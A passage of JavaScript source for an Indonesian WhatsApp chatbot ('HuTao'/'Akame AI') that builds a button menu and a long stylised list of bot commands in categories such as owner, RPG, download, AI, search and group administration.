                      title: "ᴘɪʟɪʜ sᴀʟᴀʜ sᴀᴛᴜ",
                      highlight_label: "Top Feature HuTao",
                      rows: [
                        {
                          title: "All Menu",
                          description: "Display Allmenu",
                          id: ".allmenu",
                        },
                        {
                          title: "Owner",
                          description: "Display Creator HuTao",
                          id: ".owner",
                        },
                        {
                          title: "Script",
                          description: "Display Script HuTao",
                          id: ".sc",
                        },
                      ],
                    },
                  ],
                }),
              },
              viewOnce: true,
            },
          ];

          buttonMessage.buttons.push(...flowActions);

          await Kilianhst.sendMessage(m.chat, buttonMessage, {
            quoted: m,
          });
          Kilianhst.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        }
        break;
      case "allmenu":
      case "HuTao":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          Kilianhst.sendMessage(from, { react: { text: "⚡", key: m.key } });
          const anj = `ʜᴀʟᴏ ᴋᴀᴋ ${pushname} 👏
sᴀʏᴀ ᴀᴅᴀʟᴀʜ *ᴀᴋᴀᴍᴇ ᴀɪ* ᴀsɪsᴛᴇɴᴛ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴜ,, ᴋᴀᴘᴀɴ ᴘᴜɴ ʏᴀ ᴋᴀᴋ 

*ᴀᴋᴀᴍᴇ ᴀɪ* ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ,, ᴅᴀʟᴀᴍ ᴋᴇʙᴜᴛᴜʜᴀɴ sᴏsɪᴀʟ ᴍᴇᴅɪᴀ sᴇᴘᴇʀᴛɪ ᴍᴇɴᴀᴄʀɪ ɪɴғᴏʀᴍᴀsɪ,, ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ʏᴀɴɢ ʙᴇʀᴀᴅᴀ ᴅɪ sᴏsᴍᴇᴅ,, ᴀsɪsᴛᴇɴᴛ ᴀɪ ( ᴀᴋᴀᴍᴇ ᴀɪ ) ᴊɪɢᴀ ʙɪsᴀ ᴍᴇɴᴇᴍᴀɴɪ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ʙᴇʀᴍᴀɪɴ ʙᴇʀsᴀᴍᴀ ᴋᴀᴍᴜ ᴏᴋᴋᴇ. 

${yy1}[ I N F O - A K A M E ]${yy1}
> ┌  ◦ ɴᴀᴍᴇʙᴏᴛ : ${global.botname}
> └  ◦ ɴᴀᴍᴇᴏᴡɴᴇʀ : ${global.ownername}
> ┌  ◦ ɴᴏᴍᴇʀ ᴄʀᴇᴀᴛᴏʀ : ${global.owner}
> └  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
> └  ◦ ᴘʀᴇғɪx : [ . ]
> └  ◦ sᴛᴀᴛᴜ : ᴘᴜʙʟɪᴄ

${yy1}[ I N F O - D A T E ]${yy1}
> ┌  ◦ ᴡᴀᴋᴛᴜ : ${waktuucapan}
> └  ◦ ᴊᴀᴍ : ${timee}͏
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⏤͟͟͞͞──────────────────
${yy1}乂 [ OWNER - MENU ] 乂${yy1}
───────────────
       ─ sᴇʟғ 
       ─ ᴘᴜʙʟɪᴄ 
       ─ ɢᴇᴛᴄᴀsᴇ 
       ─ ᴀᴅᴅᴄᴀsᴇ 
       ─ ᴇᴅɪᴛᴄᴀsᴇ
       ─ ᴀᴅᴅᴘʀᴇᴍ 
       ─ ᴅᴇʟᴘʀᴇᴍ 
       ─ ᴀᴅᴅᴘʟᴜɢɪɴs 
       ─ ᴅᴇʟᴘʟᴜɢɪɴs 
       ─ ɢᴇᴛᴘʟᴜɢɪɴs 
       ─ ʟɪsᴛᴘʟᴜɢs 
       ─ sᴀᴠᴇᴘʟᴜɢɪɴs 
       ─ ʟᴇᴍᴏɴᴍᴀɪʟ
       ─ ᴊᴏɪɴ
       ─ ʟᴇᴀᴠᴇ
       ─ ᴄʜᴀᴛ
       ─ ᴜᴘᴄʜ
       ─ ʀᴇᴀᴄᴛᴄʜ
       ─ ʙᴄɢᴄ
       ─ ʙᴀᴄᴋᴜᴘ
       ─ ʙᴘᴛᴀɢ
       ─ ᴀᴍʙɪʟᴄᴏᴅᴇ
       ─ ɢᴇᴛғɪʟᴇ
       ─ sᴇᴛғɪʟᴇ
       ─ ɴᴏᴇɴᴄ
       ─ sᴇᴛᴄᴏᴅᴇ
       ─ ᴊᴀᴛᴜʜᴋᴀɴᴅʀᴏᴘ
       ─ ʟɪsᴛʀᴇᴅᴇᴇᴍ
       ─ ʜᴀᴘᴜsʀᴇᴅᴇᴇᴍ
       ─ ʟɪsᴛғɪx
       ─ ᴀᴅᴅғɪx

⏤͟͟͞͞──────────────────
${yy1}乂 [ RPG - MENU ] 乂${yy1}
──────────────
       ─ ᴍʏɢᴜɪʟᴅ
       ─ ɢᴜɪʟᴅɪɴꜰᴏ
       ─ ᴅᴇʟɢᴜɪʟᴅ
       ─ ᴊᴏɪɴɢᴜɪʟᴅ
       ─ ᴄʀᴇᴀᴛᴇɢᴜɪʟᴅ
       ─ ʟɪꜱᴛɢᴜɪʟᴅ
       ─ ᴋᴇʀᴊᴀ 
       ─ ʙᴀɴᴋᴄᴇᴋ
       ─ ᴍᴀʟɪɴɢ
       ─ ʙᴀɴᴋɴᴀʙᴜɴɢ
       ─ ʙᴀɴᴋᴛᴀʀɪᴋ
       ─ ʙᴇʀᴋᴇʙᴏɴ
       ─ ᴄʀᴀꜰᴛɪɴɢ
       ─ ʙᴇᴛ
       ─ ʙᴏɴᴜꜱ
       ─ ʙᴜᴀʜ
       ─ ɴᴇʙᴀɴɢ
       ─ ʙᴇᴋᴇʀᴊᴀ
       ─ ʙᴀɴꜱᴏꜱ
       ─ ᴛᴀxʏ
       ─ ᴍᴜʟᴜɴɢ
       ─ ʙᴇʀʙᴜʀᴜ
       ─ ᴘᴏʟɪꜱɪ
       ─ ʙᴇʀᴅᴀɢᴀɴɢ
       ─ ʀᴀᴍᴘᴏᴋ
       ─ ʙᴜɴᴜʜ
       ─ ᴄᴏʟʟᴇᴄᴛ
       ─ ᴍᴀɴᴄɪɴɢ
       ─ ʀᴇᴘᴀɪʀ
       ─ ꜰᴇᴇᴅ
       ─ ꜰɪɢʜᴛ
       ─ ɢᴀᴊɪᴀɴ
       ─ ᴜᴘɢʀᴀᴅᴇ
       ─ ᴛʀᴀɴꜱꜰᴇʀ
       ─ ꜱʜᴏᴘ
       ─ ꜱᴇʟᴇᴄᴛꜱᴋɪʟʟ
       ─ ꜱᴀᴍᴘᴀʜ
       ─ ʀᴏᴋᴇᴛ
       ─ ᴏᴊᴇᴋ
       ─ ɴɢᴜʟɪ
       ─ ᴘᴀꜱᴀʀ
       ─ ʀᴏʙ
       ─ ʀᴇꜰᴇʀᴀʟ
       ─ ᴘᴇᴛꜱʜᴏᴘ
       ─ ᴋᴏʟᴀᴍ
       ─ ᴋᴏʙᴏʏ
       ─ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ
            
⏤͟͟͞͞──────────────────
${yy1}乂 [ DOWNLOAD - MENU ] 乂${yy1}
──────────────
       ─ ᴛɪᴋᴛᴏᴋ  ᴊɪᴋᴀ ᴇʀᴏʀ ᴘᴀᴋᴇ ʏɢ ᴋᴇ 𝟸
       ─ ᴛɪᴋᴛᴏᴋᴠ𝟸 
       ─ ᴍᴇᴅɪᴀғɪʀᴇ 
       ─ ɢɪᴛᴄʟᴏɴᴇ 
       ─ ɢᴇᴛ 
       ─ ᴘʟᴀʏ 
       ─ ᴛɪᴋᴛᴏᴋsᴇᴀʀᴄʜ
       ─ ᴛᴛ𝟹 
       ─ ɪɢᴅʟ
       ─ ʏᴛᴍᴘ𝟹
       ─ ʏᴛᴍᴘ𝟺
       ─ ᴘɪɴᴅᴏᴡɴ
       ─ ʏᴛs
       ─ ᴍᴇᴅɪᴀғɪʀᴇᴅʟ
       ─ ssᴡᴇʙ
              
⏤͟͟͞͞──────────────────
${yy1}乂 [ AI - MENU ] 乂${yy1}
───────────────
       ─ ᴀɪ 
       ─ ᴀɪɴsғᴡ 
       ─ ʙɪɴɢɪᴍɢ 
       ─ aiᴋᴀᴍᴇ
       ─ ʟᴜᴍɪɴᴀɪ 
       ─ ᴀᴜᴛᴏᴀɪ 
       ─ ᴋᴀᴍᴇʏᴏ 
       ─ ᴋᴀᴍᴇᴠɪᴅ 
       ─ ᴅᴇᴇᴘɪᴍɢ 
       ─ ɪsʟᴀᴍᴀɪ
       ─ ᴍᴇᴛᴀᴀɪ
       ─ ᴋᴀᴍᴇᴀɪ
       ─ ᴀɪᴀɢᴀᴍᴀ
       ─ sᴀᴀɴᴠɪ
       ─ ɢᴘᴛ
       ─ ғʟᴜx
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ SEARCH - MENU ] 乂${yy1}
───────────────
       ─ sɢɢʟ 
       ─ ᴀɴɪᴍᴇ 
       ─ ᴍᴇᴍᴇ 
       ─ ᴘɪɴ  
       ─ ᴍᴄᴀᴅᴅᴏɴs 
       ─ ᴊᴀʟᴀɴᴛɪᴋᴜs 
       ─ ғᴀᴊᴀʀ 
       ─ ʟᴀʏᴀʀᴋᴀᴄᴀ 
       ─ sɪɴᴅᴏ 
       ─ ᴋᴏɴᴛᴀɴ 
       ─ ᴋᴏᴍᴘᴀs 
       ─ ɪɴғᴏɴᴇɢᴀʀᴀ
       ─ ɢʀᴏᴜᴘsᴇᴀʀᴄʜ
       ─ ᴠᴄᴄ
       ─ ɢᴇᴛʟɪʀɪᴋ
       ─ ɢᴀʟᴀᴜ
       ─ ᴄᴋᴀʟᴇɴᴅᴇʀ
       ─ ᴋᴏᴍɪᴋᴜ
       ─ ᴄɪɴғᴏ
       ─ ʟɪᴘᴜᴛᴀɴ
       ─ ᴄᴇᴋɪᴅᴄʜ
       ─ ʏᴛsᴛᴀʟᴋ
       ─ ᴜʜᴅᴘᴀᴘᴇʀ
       ─ ᴄᴜᴀᴄᴀ
       ─ ᴄʜᴀᴘᴛᴇʀᴅᴇx
       ─ ᴍᴀɴɢᴀᴅᴇx
       ─ ғғsᴛᴀʟᴋ
       ─ ᴍᴇᴍᴇʀᴀɴᴅᴏᴍ
       ─ ᴄᴇᴋᴀsᴀʟ
       ─ ᴄᴇᴋᴀsᴀʟᴍʙᴇʀ
       ─ ᴊᴀᴅᴡᴀᴛᴠ
       ─ ɪɴғᴏɢᴇᴍᴘᴀ
       ─ ɪɢsᴛᴀʟᴋ
       ─ ʜɪɪᴛᴡɪxᴛᴏʀ
       ─ sᴀɴɪᴍᴇ
       ─ ᴀᴘᴋ
       ─ ғᴀᴋᴛᴀ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ ISLAM - MENU ] 乂${yy1}
───────────────
        ─ ᴅᴏᴀʜᴀʀɪᴀɴ
        ─ ᴋɪsᴀʜɴᴀʙɪ
        ─ ᴊᴀᴅᴡᴀʟsʜᴏʟᴀᴛ
        ─ ᴀɪᴀɢᴀᴍᴀ
        ─ ᴀsᴍᴀᴜʟʜᴜsɴᴀ
        ─ ʟɪsᴛsᴜʀᴀʜ
        ─ ʀᴀɴᴅᴏᴍǫᴜʀᴀɴ

⏤͟͟͞͞──────────────────
${yy1}乂 [ CONVERT - MENU ] 乂${yy1}
───────────────
       ─ ʙʀᴀᴛ 
       ─ ʙʀᴀᴛᴠɪᴅ 
       ─ ʜɪᴛᴀᴍᴋᴀɴ 
       ─ ᴀɴɪᴍᴇʙʀᴀᴛ 
       ─ ᴛᴛs 
       ─ ᴛᴛs𝟸
       ─ ᴘᴀsᴛᴇʙɪɴ
       ─ ᴛʀᴀɴsʟᴀᴛᴇ
       ─ ʜɪᴊᴀʙᴋᴀɴ
       ─ ᴘᴜᴛɪʜᴋᴀɴ
       ─ ᴛᴏᴜʀʟ
       ─ ʀᴠᴏ
       ─ ʜᴅ
       ─ ʜᴅᴠɪᴅ

⏤͟͟͞͞──────────────────
${yy1}乂 [ STORE - MENU ] 乂${yy1}
───────────────       
       ─ ᴅᴏɴᴇ
       ─ ᴘʀᴏsᴇs
       ─ ᴅᴀɴᴀ
       ─ ɢᴏᴘᴀʏ
       ─ ᴏᴠᴏ
       ─ ǫʀɪs
       ─ ᴋᴀʟᴋᴜᴀʟᴀᴛᴏʀ
       ─ ᴄᴏɴғɪʀᴍ
       ─ ʙᴜʏsᴄ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ MAIN - MENU ] 乂${yy1}
───────────────
       ─ ᴛᴏᴛᴀʟғɪᴛᴜʀ 
       ─ ᴅᴀғᴛᴀʀ 
       ─ ᴏᴡɴᴇʀ 
       ─ ᴀɴɪᴍᴇ 
       ─ ᴛᴇsᴛ 
       ─ sᴄ 
       ─ ɴᴜʟɪs 
       ─ ʀᴀɴɢᴋᴜᴍʏᴛ 
       ─ ʀᴀʏᴀ 
       ─ ᴊᴋ𝟺𝟾ʟɪᴠᴇ 
       ─ ʜɪᴛᴀᴍᴋᴀɴ 
       ─ ᴅᴏɴɢᴇɴɢ
       ─ ᴛǫᴛᴏ
       ─ ɢᴇᴛᴘɪᴄ
       ─ ɢᴀᴄʜᴀ-ᴍᴇᴍʙᴇʀ
       ─ ᴄᴇᴋᴋᴀʀᴛᴜ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ PLUGINS - MENU ] 乂${yy1}
───────────────
       ─ ᴀᴅᴅᴘʟᴜɢɪɴs 
       ─ ᴅᴇʟᴘʟᴜɢɪɴs 
       ─ ɢᴇᴛᴘʟᴜɢɪɴs 
       ─ ʟɪsᴛᴘʟᴜɢs 
       ─ sᴀᴠᴇᴘʟᴜɢɪɴs 

⏤͟͟͞͞──────────────────
${yy1}乂 [ GROUP - MENU ] 乂${yy1}
───────────────       
       ─ ᴋɪᴄᴋ 
       ─ ʜɪᴅᴇᴛᴀɢ 
       ─ ᴛᴀɢᴀʟʟ 
       ─ ᴛᴏᴛᴀɢ 
       ─ ᴏᴘᴇɴ 
       ─ ᴏᴘᴇɴᴛɪᴍᴇ 
       ─ ᴄʟᴏꜱᴇ 
       ─ ᴄʟᴏꜱᴇᴛɪᴍᴇ 
       ─ ᴘʀᴏᴍᴏᴛᴇ 
       ─ ᴅᴇᴍᴏᴛᴇ 
       ─ ꜱᴇᴛɴᴀᴍᴇ 
       ─ ꜱᴇᴛᴅᴇꜱᴄ 
       ─ ʟɪɴᴋɢᴄ 
       ─ ʀᴇᴠᴏᴋᴇ 
       ─ ᴀɴᴛɪʟɪɴᴋɢᴄ 

⏤͟͟͞͞──────────────────
${yy1}乂 [ AONYMOUS - MENU ] 乂${yy1}
───────────────
        ─ ᴍᴇɴғᴇs
        ─ ʙᴀʟᴀsᴍᴇɴғᴇs

⏤͟͟͞͞──────────────────
${yy1}乂 [ ANTI - MENU ] 乂${yy1}
───────────────              
       ─ ᴀɴᴛɪᴘʀᴏᴍᴏᴛɪᴏɴ        
       ─ ᴀɴᴛɪᴡᴀᴍᴇ 
       ─ ᴀɴᴛɪᴀꜱɪɴɢ 
       ─ ᴀɴᴛɪᴠɪʀᴛᴇx 
       ─ ᴀɴᴛɪʟɪɴᴋᴀʟʟ 
       ─ ᴀɴᴛɪʟɪɴᴋꜰʙ 
       ─ ᴀɴᴛɪʟɪɴᴋᴛɪᴋᴛᴏᴋ 
       ─ ᴀɴᴛɪʟɪɴᴋʏᴛ 
       ─ ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ 
       ─ ᴀɴᴛɪʟɪɴᴋɪɢ 
       ─ ᴀɴᴛɪʟɪɴᴋᴛᴇʟᴇ 
       ─ ᴀɴᴛɪᴅᴇᴡᴀsᴀ 
       ─ ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛᴛᴇʀ 
       ─ ᴀɴᴛɪʟɪɴᴋɢᴄ 
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ CPANEL - MENU ] 乂${yy1}
───────────────      
       ─ 𝟷ɢʙ
       ─ 𝟸ɢʙ
       ─ 𝟹ɢʙ
       ─ 𝟺ɢʙ
       ─ 𝟻ɢʙ
